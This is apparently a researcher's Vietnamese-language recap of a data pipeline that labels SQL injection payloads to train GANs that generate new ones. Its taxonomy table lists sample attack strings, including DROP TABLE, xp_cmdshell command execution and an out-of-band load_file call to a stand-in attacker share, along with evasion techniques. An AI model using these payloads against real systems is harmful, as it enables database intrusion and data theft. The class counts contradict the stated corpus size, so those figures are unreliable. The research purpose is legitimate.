# Data Engineering Recap — Dự án GAN sinh SQL Injection

> **Đối tượng đọc**: Bản thân nghiên cứu sinh khi quay lại dự án sau gián đoạn dài, cần nhớ lại nhanh: pipeline đã làm gì, output nằm đâu, schema thế nào, bước tiếp theo là gì. Phong cách technical, không có analogy/giải thích nền tảng (xem `Data_Engineering_Foundation.md` cho concepts; `Onboarding_Data_Engineering.md` cho người chưa có background).

> **Cập nhật**: 2026-05-04
> **Trạng thái pipeline**: ✅ Hoàn tất 100% (1,382/1,382 batches classified, 41,460 rows có nhãn)

---

## 1. Mục tiêu pipeline

Xây dựng **dataset SQL Injection chất lượng cao, có nhãn cấu trúc** (loại tấn công + DB engine + confidence) để feed vào 3 hướng GAN: VAE-GAN, SeqGAN, Gumbel-Softmax. Output cuối cùng là một corpus dạng tabular có thể (a) dùng trực tiếp huấn luyện Generator/Discriminator, (b) split per-attack-type cho conditional generation, (c) làm benchmark cố định để so sánh các phương pháp.

**Đặc thù bài toán so với text generation thông thường**:
- SQLi là *Constrained Discrete Sequence Generation* (CDSG) — chuỗi token phải tuân thủ ngữ pháp SQL (hard constraint).
- Cần phân biệt SQL hợp pháp vs SQL độc hại — không chỉ "real text vs random noise".
- Có nhiều **biến thể obfuscation** (URL encoding, comment injection, case variation, hex string) → model phải học được "structure" thay vì surface form.

---

## 2. Sơ đồ luồng pipeline (6 bước)

```
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│  1. Loaders  │ →  │ 2. Normalizer│ →  │ 3. Classifier│
│  (5 nguồn)   │    │  (URL decode,│    │  (rule-based │
│              │    │   case fold) │    │   + ML + AI) │
└──────────────┘    └──────────────┘    └──────────────┘
                                                ↓
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│  6. Reporter │ ←  │  5. Splitter │ ←  │4. Deduplicator│
│  (stats CSV) │    │ (per-type    │    │ (exact +      │
│              │    │  train/test) │    │  normalized   │
└──────────────┘    └──────────────┘    │  + semantic)  │
                                        └──────────────┘
```

| Bước | Module Python | Output trung gian |
|---|---|---|
| 1. Loaders | `data_engine/loaders.py` | List[Dict] gốc từ 5 nguồn |
| 2. Normalizer | `data_engine/normalizer.py` | `payload_norm`, `payload_delex` |
| 3. Classifier | `data_engine/classifier.py` (rule) + `data_engine/ai_classifier.py` (AI) + `Asset/Opencode/classify*.py` (worker) | `sqli_type`, `db_engine`, `confidence`, `reasoning` |
| 4. Deduplicator | `data_engine/deduplicator.py` | Bộ payload đã loại trùng (3 cấp) |
| 5. Splitter | `data_engine/splitter.py` | Per-type CSVs trong `Asset/Data/data/splits/` |
| 6. Reporter | `data_engine/pipeline.py` (orchestrator) | Stats reports |

---

## 3. Nguồn dữ liệu raw (5 nguồn chính)

| Nguồn | Vị trí | Số mẫu | Trạng thái | Ghi chú |
|---|---|---|---|---|
| **SQLiv5 Dataset** | `Asset/Data/sqliv5_dataset/SQLiV{3,4,5}.{csv,json}` | ~162k JSON V5 | ✅ Đã tải | nidnogg/sqliv5-dataset trên GitHub |
| **sqlmap payloads** | `Asset/Data/sqlmap_payloads/` (git sparse-checkout) | ~500-2k | ✅ Đã tải | XML payload definitions, có attack type tag |
| **SecLists SQLi** | `Asset/Data/seclists_sqli/` (git sparse-checkout) | ~594 | ✅ Đã tải | Fuzzing/Databases/SQLi/, chuyên sâu theo DB |
| **ExploitDB SQLi** | `Asset/Data/exploitdb_sqli/{sqli_exploits,files_exploits}.csv` | 8,696 CVEs | ✅ Đã tải | Metadata CVE, không có payload thực — dùng làm reference |
| **BCCC-SFU 2023** | `Asset/Data/BCCC-SFU-SQLInj-2023.csv` | 11,011 | ✅ Đã tải | Public academic dataset |
| **Kaggle (sajid576)** | (chưa pull) | ~30-50k | ⏳ Cần API key | Phương án mở rộng nếu cần thêm data |

**Tổng raw** trước dedup: ~195k mẫu thô. Sau dedup + filter chất lượng: **41,460 payloads** trong `master_unlabeled.csv`.

---

## 4. Schema dữ liệu chính

### 4.1 `Asset/Guiding/master_unlabeled.csv` (input cho classifier — 41,460 rows)

| Cột | Kiểu | Mô tả |
|---|---|---|
| `payload_raw` | string | Payload gốc, không sửa đổi (whitespace có thể nhiều) |
| `payload_norm` | string | Đã URL-decode + collapse whitespace + case fold |
| `payload_delex` | string | De-lexicalized: `<TABLE>`, `<COL>`, `<NUM>`, `<STR>` thay tên cụ thể |
| `label` | int | `0` = benign SQL, `1` = SQLi |
| `is_obfuscated` | bool | Có dấu hiệu obfuscation hay không (flagged trước normalize) |
| `sqli_type_hint` | string | Hint từ source nếu có (mostly empty trong input) |
| `source` | string | Tên dataset gốc (`sqli_dataset`, `sqlmap`, `seclists`, ...) |

**Ví dụ row**:
```csv
"' or pg_sleep ( __TIME__ ) --","' or pg_sleep ( __TIME__ ) --","' or pg_sleep ( __TIME__ ) --",1,False,,sqli_dataset
```

### 4.2 `Asset/Data/batches/batch_*.csv` (input cho AI classifier worker — 1,382 file × 30 rows)

| Cột | Kiểu | Mô tả |
|---|---|---|
| `row_index` | int | Index trong batch (0-29) |
| `payload_norm` | string | Đã chuẩn hóa, sẵn sàng feed vào classifier |
| `label` | int | 0/1 từ master |
| `sqli_type_hint` | string | Hint nếu có |

### 4.3 `Asset/Data/results/result_batch_*.csv` (output AI classifier — 1,382 file)

| Cột | Kiểu | Mô tả |
|---|---|---|
| `row_index` | int | Khớp với batch tương ứng |
| `sqli_type` | enum | 1 trong 13 loại SQLi (xem mục 5) |
| `db_engine` | enum | mysql / oracle / postgresql / mssql / sqlite / nosql / unknown |
| `confidence` | float | Độ tự tin của AI, range [0, 1] |
| `reasoning` | string | 1 câu giải thích lý do gán nhãn |

**Ví dụ rows**:
```csv
0,time_blind,postgresql,0.95,"pg_sleep is PostgreSQL time-based blind SQLi"
1,stacked_queries,oracle,0.90,"CREATE USER is DDL requiring stacked queries in Oracle"
2,error_based,oracle,0.95,"utl_inaddr.get_host_address is Oracle error-based blind SQLi"
```

---

## 5. 13 nhãn SQLi (taxonomy đầy đủ)

| Nhãn | Tỉ lệ corpus | Đặc trưng | Ví dụ payload |
|---|---|---|---|
| `union_based` | ~6.8% (4,059) | Khai thác `UNION SELECT` để ghép kết quả query | `' UNION SELECT 1,version() -- ` |
| `error_based` | ~4.3% (2,562) | Cố ý gây lỗi để đọc thông tin trong message | `AND extractvalue(1, concat(0x7e, version()))` |
| `boolean_blind` | ~5.9% (3,489) | Hỏi yes/no qua `AND 1=1` vs `AND 1=2` | `' AND substr(version(),1,1)='5'-- ` |
| `time_blind` | ~4.1% (2,409) | Hỏi yes/no qua delay (`SLEEP`, `WAITFOR`, `pg_sleep`) | `'; SELECT pg_sleep(5)-- ` |
| `heavy_query` | ~0.9% (536) | Cross-join gây tải CPU làm response chậm | `AND (SELECT count(*) FROM t1, t2, t3) > 0` |
| `stacked_queries` | ~0.1% (37) | Thực thi nhiều câu lệnh độc lập (`;`) | `'; DROP TABLE users-- ` |
| `lateral` | ~0.8% (464) | JOIN-based injection | `' AND 1 IN (SELECT MAX(x) FROM t)-- ` |
| `second_order` | ~0.7% (442) | Stored injection — payload trigger lúc retrieve | (cần context multi-step) |
| `auth_bypass` | ~0.1% (55) | `' OR '1'='1` để bypass login | `admin'-- ` |
| `out_of_band` | ~0.0% (17) | DNS/HTTP exfil — gửi data ra server attacker | `'; SELECT load_file('\\\\attacker\\share')` |
| `rce` | ~0.0% (16) | Command execution qua DB function | `'; EXEC xp_cmdshell('whoami')-- ` |
| `polyglot` | ~0.0% (3) | Multi-context (vừa SQLi vừa XSS vừa LDAP) | (rất hiếm) |
| `unknown` | ~76.3% (45,288) | Chưa classify được hoặc nhãn không rõ | (placeholder) |

**Lưu ý phân phối**: corpus rất imbalanced (`unknown` chiếm 76%, `polyglot`/`rce`/`out_of_band` < 0.1%). Khi train GAN cần xử lý: (a) oversample các class hiếm, hoặc (b) chỉ train trên top-5 class phổ biến (union, boolean_blind, time_blind, error_based, lateral).

---

## 6. DB engines & Evasion techniques (metadata bổ sung)

**6 DB engines** được nhận diện qua keywords/functions đặc trưng:

| DB engine | Signature functions |
|---|---|
| `mysql` | `version()`, `@@version`, `concat()`, `0x...` hex, `/*!...*/` versioned comment |
| `oracle` | `utl_inaddr`, `dbms_lock.sleep`, `sys.all_tables`, `dual` |
| `postgresql` | `pg_sleep`, `pg_user`, `current_database()`, `::text` cast |
| `mssql` | `xp_cmdshell`, `sysobjects`, `sys.databases`, `WAITFOR DELAY` |
| `sqlite` | `sqlite_master`, `sqlite_version()`, `randomblob` |
| `nosql` | `$where`, `$ne`, `$regex`, `db.collection.find()` |

**Evasion techniques** được flag trong `is_obfuscated`:
- URL encoding (`%27` thay `'`, `%20` thay space)
- Case variation (`UnIoN sElEcT`)
- Hex string (`0x53454c454354` thay `SELECT`)
- Comment obfuscation (`UN/**/ION`, `--%0a`)
- Whitespace tricks (`UNION%20%20%20SELECT`)
- Encoding chains (double URL encode, HTML entity)

---

## 7. Quy tắc đánh nhãn (3-tier hybrid)

Pipeline dùng **3 tầng đánh nhãn** xếp chồng để tăng độ chính xác:

### Tier 1 — Rule-based (`data_engine/classifier.py`)
- Match keyword/regex đơn giản: nếu thấy `UNION SELECT` → `union_based`, `pg_sleep` → `time_blind` + `postgresql`...
- Confidence: 0.7-0.9 (cao khi keyword rõ ràng, thấp khi mơ hồ)
- Tốc độ: nhanh (~ms/payload)
- Coverage thấp: chỉ classify được ~25% corpus

### Tier 2 — ML classifier (`data_engine/train_classifier.py`)
- TF-IDF vectorizer + RandomForest (đã train, lưu tại `Asset/Data/data/artifacts/tfidf_vectorizer.pkl`)
- Accuracy ~95.2% trên held-out
- Dùng cho payload không match rule rõ ràng

### Tier 3 — AI classifier (`data_engine/ai_classifier.py` + `Asset/Opencode/classify*.py`)
- Gọi LLM (GPT-4o-mini hoặc tương đương) qua API
- Prompt: yêu cầu trả về `sqli_type`, `db_engine`, `confidence`, `reasoning` dạng JSON
- Dùng cho **toàn bộ corpus** để có nhãn đồng nhất + reasoning có thể audit
- Tốn API budget — chia thành 1,382 batches × 30 rows để control rate limit

**Quy ước confidence threshold**:
- ≥ 0.85: chấp nhận trực tiếp
- 0.60-0.85: cần human review (đã làm thủ công)
- < 0.60: gán `unknown`, để AI re-classify ở pass sau

---

## 8. Code locations & artifacts

### 8.1 Pipeline module — `data_engine/`

```
data_engine/
├── __init__.py
├── config.py              # 13 SQLi types, 7 DB engines, evasion techs, paths
├── loaders.py             # Load từ 5 nguồn raw
├── normalizer.py          # URL decode, case fold, whitespace collapse
├── prepare.py             # Pipeline glue: loaders → normalize → delex
├── classifier.py          # Rule-based classification (Tier 1)
├── train_classifier.py    # ML classifier training (Tier 2)
├── ai_classifier.py       # LLM API caller (Tier 3)
├── deduplicator.py        # Exact + normalized + semantic dedup
├── splitter.py            # Per-type train/val/test split
├── pipeline.py            # End-to-end orchestrator
├── merge.py               # Merge result_batch_*.csv → master_sqli.csv
├── run_final.py           # Final run script
├── checkpoints/           # Empty — sẽ chứa pipeline checkpoints
├── output/, outputs/      # Output artifacts
└── VERIFIED.txt           # Checklist verification
```

### 8.2 Worker module — `Asset/Opencode/`

```
Asset/Opencode/
├── classify.py             # AI classification core (gọi GPT-4o-mini)
├── run_classify.py         # Entry point single-batch
├── classify_batch.py       # Classify từng batch
├── classify_auto.py        # Auto-loop classify continuously
├── check_duplicates.py     # MD5 hash check duplicates
├── check_duplicates_v2.py  # V2 với full reasoning field
├── delete_duplicates.py    # Xóa duplicate (DESTRUCTIVE — backup trước)
├── list_duplicates.py      # List dups bằng tiếng Việt
├── split_results*.py       # Split kết quả thành chunks
├── KE_HOACH.md             # Kế hoạch chi tiết classification workflow (141 dòng)
├── RECOVERY.md             # Recovery protocol khi mất điện (142 dòng)
└── progress.json           # ✅ STATUS: completed, 1382/1382, rows 41,460/41,460
```

### 8.3 Data artifacts — `Asset/Data/`

```
Asset/Data/
├── batches/                # 1,382 input file (30 rows mỗi file)
├── results/                # 1,382 classified output file
├── data/raw/               # CSV thô (sqli_dataset, sqli_dataset_clean, advanced_sqli, sqli_structural_deduped)
├── data/processed/         # dataset.pkl (270M), dataset_saq.pkl (594M), sqli_pool_deduped.csv (30M)
├── data/splits/            # train_idx.npy, test_idx.npy
├── data/artifacts/         # tfidf_vectorizer.pkl
├── sqliv5_dataset/         # SQLiV{3,4,5}.{csv,json}
├── exploitdb_sqli/         # CVE metadata
├── sqlmap_payloads/        # XML payloads
├── seclists_sqli/          # Fuzzing payloads
└── BCCC-SFU-SQLInj-2023.csv
```

### 8.4 Root scripts (legacy hoặc duplicated copies)

`prepare.py`, `merge.py`, `ai_classifier.py`, `classify_batches.py`, `master_unlabeled.csv` — bản copy từ `data_engine/` để chạy nhanh từ root.

---

## 9. Trạng thái hiện tại (2026-05-04)

| Stage | Status | Verified by |
|---|---|---|
| Loaders + Normalizer | ✅ Done | Tất cả 5 nguồn đã có file processed trong `Asset/Data/` |
| Master_unlabeled.csv | ✅ Done | 41,460 rows, 7 cột, schema đúng |
| Batch creation (1,382 batches) | ✅ Done | `Asset/Data/batches/batch_0001..batch_1382.csv` |
| AI classification (Tier 3) | ✅ 100% Done | `Asset/Opencode/progress.json`: `"status": "completed"`, `1382/1382` |
| Result CSVs (1,382) | ✅ Done | `Asset/Data/results/result_batch_0001..1382.csv` |
| Merge results → master_sqli | ⏳ **Cần verify** | Chưa xác nhận có file `master_sqli.csv` final hay chưa |
| Per-type splits | ⏳ **Cần làm hoặc verify** | Cần check `Asset/Data/data/splits/` xem đã có file `train_<type>.csv`, `test_<type>.csv` chưa |
| Stats report | ⏳ **Optional** | Distribution analysis có thể chưa được sinh đầy đủ |

**Bước tiếp theo (priority order)**:
1. **Merge 1,382 result CSVs → 1 master_sqli.csv** (chạy `data_engine/merge.py` hoặc `Asset/Opencode/split_*.py` reverse). Schema kết quả: 12 cột = 7 cột master_unlabeled + 5 cột result.
2. **Verify quality**: chạy `Asset/Opencode/check_duplicates_v2.py` để đảm bảo không còn duplicate ở kết quả; sample 100 rows random để spot-check confidence < 0.85.
3. **Tạo splits per-approach**: mỗi approach VAE-GAN/SeqGAN/Gumbel cần dataset transformation khác (xem Guiding của từng approach), nhưng base split nên cố định.
4. **Frozen test set**: chọn ~10% (~4,000 rows), bảo toàn cho mọi baseline so sánh sau này. Lưu file `frozen_test_set.csv` và git commit.

---

## 10. Quick re-run guide (5 lệnh)

Giả sử cần re-build pipeline từ đầu (vd sau khi pull data mới hoặc sửa rule):

```powershell
# 1. Vào project root
cd C:\Users\Admin\Documents\GAN

# 2. Activate venv (giả định đã có)
.\venv\Scripts\Activate.ps1

# 3. Re-run loaders + normalizer (sinh master_unlabeled.csv)
python -m data_engine.prepare

# 4. Tạo lại batches (1382 file × 30 rows)
python -m data_engine.pipeline --stage batches

# 5. Chạy AI classifier (tốn API budget — đã làm xong, không cần re-run trừ khi sửa prompt)
python -m Asset.Opencode.classify_auto --resume   # respect progress.json

# 6. Merge results → master_sqli.csv
python -m data_engine.merge
```

**Sanity check sau khi merge**:
```powershell
python -c "import pandas as pd; df = pd.read_csv('Asset/Data/master_sqli.csv'); print(df.shape, df['sqli_type'].value_counts())"
```
Kỳ vọng: shape ~`(41460, 12)`, distribution khớp với mục 5.

---

## 11. Các quyết định thiết kế đã chốt (để khỏi tranh luận lại)

1. **De-lexicalization partial cho VAE-GAN, full cho SeqGAN/Gumbel** — VAE-GAN cần giữ keyword tấn công làm signal cho encoder, SeqGAN/Gumbel cần ép model học structure thuần. Chi tiết trong Guiding của từng approach.
2. **Tokenization SQL-aware (regex-based)**, KHÔNG dùng BPE/WordPiece pretrained — vì pretrained tokenizers train trên natural language, sẽ phân tách sai SQL keywords.
3. **Max length L** = percentile 95 của phân phối độ dài corpus (cần đo lại sau merge).
4. **Vocabulary fixed** sau khi finalize — không thêm token mới giữa quá trình train, nếu không break các checkpoints cũ.
5. **Frozen test set** dùng chung cho cả 3 approach — mọi so sánh metric phải trên cùng test set này.
6. **AI classifier confidence ≥ 0.85** mới accept tự động; 0.60-0.85 đã được human-review (đánh nhãn tay).

---

## 12. Tài liệu liên quan trong dự án

- `Asset/Guiding/Data_Engineering_Foundation.md` — Concepts data engineering với 4 tầng giải thích (cho team).
- `Asset/Guiding/Onboarding_Data_Engineering.md` — Phiên bản dành cho member mới không-tech (analogy đời thường).
- `Asset/Guiding/SQLi-VAE-GAN-Roadmap.md` — Roadmap chi tiết 6 giai đoạn cho VAE-GAN.
- `Asset/Guiding/SQLi-SeqGAN-Roadmap.md` — Roadmap chi tiết 6 giai đoạn cho SeqGAN.
- `Asset/Guiding/SQLi-Gumbel-SoftmaxGAN-Roadmap.md` — Roadmap chi tiết 6 giai đoạn cho Gumbel-Softmax.
- `Asset/Opencode/KE_HOACH.md` — Kế hoạch AI classification workflow chi tiết.
- `Asset/Opencode/RECOVERY.md` — Protocol khi gián đoạn classify giữa chừng.

---

*File này không thay thế các Roadmap kỹ thuật — chỉ là "bản đồ" để định vị nhanh khi quay lại dự án.*
